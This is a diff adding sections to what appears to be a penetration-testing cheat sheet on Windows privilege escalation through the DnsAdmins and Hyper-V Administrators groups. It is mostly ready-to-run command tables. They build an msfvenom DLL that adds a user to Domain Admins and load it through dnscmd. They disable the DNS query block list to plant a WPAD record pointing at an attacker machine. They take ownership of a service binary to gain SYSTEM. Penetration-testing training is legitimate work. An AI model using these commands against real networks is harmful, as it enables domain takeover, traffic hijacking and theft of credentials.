@@ -3061,8 +3061,42 @@ logs can also be used to extract sensitive data, such as user passwords and acco
 
 The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL
 
+| **Command** | **Description** |
+| --- | --- |
+| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll` | |
+| `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll` | load custom DLL as non-priv user|
+| `wmic useraccount where name="netadm" get sid` | Find user SID |
+|`net group "Domain Admins" /dom`| Confirmed Domain admin|
+| `sc.exe sdshow DNS` | Get permissions for DNS Service |
+|[mimilib](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)| Command line execution via modification of kdns.c |
+| `sc stop dns`|Stop DNS |
+| `sc start dns` | Start DNS |
+|`sc query dns` |DNS Service status|
+|`reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`| Delete registry key |
 
+Another way to abuse DnsAdmins group privileges is by creating a WPAD record. 
+Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. 
+Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. 
+These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.
+
+| **Command** | **Description** |
+| --- | --- |
+|`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`|Disable WPAD Query Block list |
+|`Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`|Add a WPAD record point to attacker controlled machine|
 ---
+
+##### Hyper-V Administrators 
+
+The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. 
+They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
+It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\SYSTEM, without impersonating the user
+
+| **Command** | **Description** |
+| --- | --- |
+|[Mozilla Maintenance Service hardlink](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)| NT Hardlink proof of concept |
+|`takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`| Take ownership of file 
+|`sc.exe start MozillaMaintenance`| Start malicious service |
+|Hardlink has been mitigated by March 2020 Windows security update||
 
 ### Handy Commands
 
